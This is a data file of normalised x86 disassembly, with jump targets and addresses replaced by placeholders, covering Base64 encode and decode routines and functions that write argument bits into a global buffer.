sub_401020
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0xc ] r--data
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x10 ]
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] 0x0
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
movsx edx [ ecx ]
sar edx 0x2
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov dl [ ecx + edx ]
mov [ eax ] dl
mov eax [ ebp + 0xc ]
movsx ecx [ eax ]
shl ecx 0x4
and ecx 0x30
mov [ ebp - 0xd ] cl
mov edx [ ebp - 0x4 ]
add edx 0x2
cmp edx [ ebp + 0x10 ]
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x2 ] 0x3d
mov edx [ ebp + 0x8 ]
mov [ edx + 0x3 ] 0x3d
mov eax [ ebp + 0xc ]
movsx ecx [ eax + 0x1 ]
sar ecx 0x4
movzx edx [ ebp - 0xd ]
or edx ecx
mov [ ebp - 0xd ] dl
mov eax [ ebp + 0xc ]
movsx ecx [ eax + 0x1 ]
shl ecx 0x4
and ecx 0xff
sar ecx 0x2
mov [ ebp - 0x5 ] cl
mov edx [ ebp - 0x4 ]
add edx 0x3
cmp edx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x3
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
add ecx 0x3
mov [ ebp + 0xc ] ecx
mov edx [ ebp + 0x8 ]
add edx 0x4
mov [ ebp + 0x8 ] edx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x3 ] 0x3d
mov eax [ ebp + 0xc ]
movsx ecx [ eax + 0x2 ]
sar ecx 0x6
movzx edx [ ebp - 0x5 ]
or edx ecx
mov [ ebp - 0x5 ] dl
mov eax [ ebp + 0xc ]
movsx ecx [ eax + 0x2 ]
and ecx 0x3f
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
mov cl [ eax + ecx ]
mov [ edx + 0x3 ] cl
jmp r-xdata
movzx eax [ ebp - 0xd ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov al [ edx + eax ]
mov [ ecx + 0x1 ] al
jmp r-xdata
movzx eax [ ebp - 0x5 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov al [ edx + eax ]
mov [ ecx + 0x2 ] al
jmp r-xdata
sub_401130
push ebp
mov ebp esp
movsx eax [ ebp + 0x8 ]
cmp eax 0x41
jl r-xdata
movsx edx [ ebp + 0x8 ]
cmp edx 0x61
jl r-xdata
movsx ecx [ ebp + 0x8 ]
cmp ecx 0x5a
jg r-xdata
movsx ecx [ ebp + 0x8 ]
cmp ecx 0x30
jl r-xdata
movsx eax [ ebp + 0x8 ]
cmp eax 0x7a
jg r-xdata
movsx eax [ ebp + 0x8 ]
sub eax 0x41
jmp r-xdata
movsx eax [ ebp + 0x8 ]
cmp eax 0x2b
jne r-xdata
movsx edx [ ebp + 0x8 ]
cmp edx 0x39
jg r-xdata
movsx eax [ ebp + 0x8 ]
sub eax 0x47
jmp r-xdata
pop ebp
retn
movsx ecx [ ebp + 0x8 ]
cmp ecx 0x2f
jne r-xdata
mov al 0x3e
jmp r-xdata
movsx eax [ ebp + 0x8 ]
add eax 0x4
jmp r-xdata
xor al al
mov al 0x3f
jmp r-xdata
sub_4011b0
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x10 ]
sub edx 0x1
mov [ ebp + 0x10 ] edx
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x3
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
movzx edx [ ecx ]
push edx
call sub_401130
add esp 0x4
movsx eax al
shl eax 0x2
and eax 0xff
mov [ ebp - 0x9 ] al
mov ecx [ ebp + 0xc ]
movzx edx [ ecx + 0x1 ]
push edx
call sub_401130
add esp 0x4
mov [ ebp - 0x8 ] al
movsx eax [ ebp - 0x8 ]
sar eax 0x4
movsx ecx [ ebp - 0x9 ]
or ecx eax
mov [ ebp - 0x9 ] cl
mov edx [ ebp + 0xc ]
movsx eax [ edx + 0x2 ]
cmp eax 0x3d
je r-xdata
mov edx [ ebp - 0x4 ]
sub edx 0x2
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x7 ] 0x0
mov al [ ebp - 0x7 ]
mov [ ebp - 0x6 ] al
mov [ ebp + 0x10 ] 0x0
movsx ecx [ ebp - 0x8 ]
and ecx 0xf
shl ecx 0x4
mov [ ebp - 0x6 ] cl
mov edx [ ebp + 0xc ]
movzx eax [ edx + 0x2 ]
push eax
call sub_401130
add esp 0x4
mov [ ebp - 0x5 ] al
movsx ecx [ ebp - 0x5 ]
sar ecx 0x2
movsx edx [ ebp - 0x6 ]
or edx ecx
mov [ ebp - 0x6 ] dl
mov eax [ ebp + 0xc ]
movsx ecx [ eax + 0x3 ]
cmp ecx 0x3d
je r-xdata
mov eax [ ebp + 0xc ]
add eax 0x4
mov [ ebp + 0xc ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0x1
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x7 ] 0x0
mov [ ebp + 0x10 ] 0x0
movsx edx [ ebp - 0x5 ]
shl edx 0x6
and edx 0xff
mov [ ebp - 0x7 ] dl
mov eax [ ebp + 0xc ]
movzx ecx [ eax + 0x3 ]
push ecx
call sub_401130
add esp 0x4
movsx edx al
movsx eax [ ebp - 0x7 ]
or eax edx
mov [ ebp - 0x7 ] al
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov dl [ ebp - 0x9 ]
mov [ ecx ] dl
mov eax [ ebp + 0x8 ]
add eax 0x1
mov [ ebp + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov dl [ ebp - 0x6 ]
mov [ ecx ] dl
mov eax [ ebp + 0x8 ]
add eax 0x1
mov [ ebp + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov dl [ ebp - 0x7 ]
mov [ ecx ] dl
mov eax [ ebp + 0x8 ]
add eax 0x1
mov [ ebp + 0x8 ] eax
jmp r-xdata
jmp r-xdata
sub_401310
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
shl eax 0x8
sar eax 0xf
and eax 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
shl edx 0x9
sar edx 0xf
and edx 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xa
sar ecx 0xf
and ecx 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xb
sar eax 0xf
and eax 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
shl edx 0xc
sar edx 0xf
and edx 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xd
sar ecx 0xf
and ecx 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xe
sar eax 0xf
and eax 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
shl edx 0xf
sar edx 0xf
and edx 0x1
je r-xdata
pop ebp
retn
sub_401550
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x3
jne r-xdata
cmp [ ebp + 0xc ] 0x4
jne r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov edx [ ebp + 0x8 ]
shl edx 0xd
sar edx 0xf
and edx 0x1
je r-xdata
cmp [ ebp + 0xc ] 0x5
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jl r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
cmp [ ebp + 0xc ] 0x6
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jl r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov edx [ ebp + 0x8 ]
shl edx 0xc
sar edx 0xf
and edx 0x1
je r-xdata
cmp [ ebp + 0x8 ] 0x8
jge r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xe
sar ecx 0xf
and ecx 0x1
je r-xdata
cmp [ ebp + 0xc ] 0x7
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jl r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov ecx [ ebp + 0x8 ]
shl ecx 0xb
sar ecx 0xf
and ecx 0x1
je r-xdata
cmp [ ebp + 0x8 ] 0x8
jge r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov edx [ ebp + 0x8 ]
shl edx 0xd
sar edx 0xf
and edx 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xf
sar eax 0xf
and eax 0x1
je r-xdata
cmp [ ebp + 0xc ] 0x8
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jl r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov edx [ ebp + 0x8 ]
shl edx 0xa
sar edx 0xf
and edx 0x1
je r-xdata
cmp [ ebp + 0x8 ] 0x8
jge r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov ecx [ ebp + 0x8 ]
shl ecx 0xd
sar ecx 0xf
and ecx 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xd
sar ecx 0xf
and ecx 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
pop ebp
retn
mov edx [ rwxdata ]
add edx 0x4
mov [ rwxdata ] edx
jmp r-xdata
cmp [ ebp + 0xc ] 0x9
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jl r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov edx [ ebp + 0x8 ]
shl edx 0x9
sar edx 0xf
and edx 0x1
je r-xdata
cmp [ ebp + 0x8 ] 0x8
jge r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov edx [ ebp + 0x8 ]
shl edx 0xd
sar edx 0xf
and edx 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xc
sar eax 0xf
and eax 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xe
sar eax 0xf
and eax 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xe
sar ecx 0xf
and ecx 0x1
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jl r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov ecx [ ebp + 0x8 ]
shl ecx 0x8
sar ecx 0xf
and ecx 0x1
je r-xdata
cmp [ ebp + 0x8 ] 0x8
jge r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov edx [ ebp + 0x8 ]
shl edx 0xd
sar edx 0xf
and edx 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xb
sar ecx 0xf
and ecx 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
shl edx 0xd
sar edx 0xf
and edx 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xe
sar eax 0xf
and eax 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
shl edx 0xf
sar edx 0xf
and edx 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xf
sar eax 0xf
and eax 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov edx [ ebp + 0x8 ]
shl edx 0x7
sar edx 0xf
and edx 0x1
je r-xdata
cmp [ ebp + 0x8 ] 0x8
jge r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov ecx [ ebp + 0x8 ]
shl ecx 0xd
sar ecx 0xf
and ecx 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xa
sar ecx 0xf
and ecx 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xc
sar eax 0xf
and eax 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xe
sar ecx 0xf
and ecx 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xe
sar ecx 0xf
and ecx 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
shl edx 0xf
sar edx 0xf
and edx 0x1
je r-xdata
mov ecx [ rwxdata ]
add ecx 0x5
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ rwxdata ]
add edx 0x4
mov [ rwxdata ] edx
jmp r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov edx [ ebp + 0x8 ]
shl edx 0xd
sar edx 0xf
and edx 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0x9
sar eax 0xf
and eax 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xb
sar eax 0xf
and eax 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xe
sar ecx 0xf
and ecx 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
shl edx 0xd
sar edx 0xf
and edx 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xf
sar eax 0xf
and eax 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xf
sar eax 0xf
and eax 0x1
je r-xdata
jmp r-xdata
mov ecx [ rwxdata ]
add ecx 0x4
mov [ rwxdata ] ecx
jmp r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0x8
sar ecx 0xf
and ecx 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
shl edx 0xa
sar edx 0xf
and edx 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xe
sar eax 0xf
and eax 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
shl edx 0xc
sar edx 0xf
and edx 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xf
sar eax 0xf
and eax 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xe
sar ecx 0xf
and ecx 0x1
je r-xdata
jmp r-xdata
mov edx [ rwxdata ]
add edx 0x4
mov [ rwxdata ] edx
jmp r-xdata
mov edx [ rwxdata ]
add edx 0x6
mov [ rwxdata ] edx
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
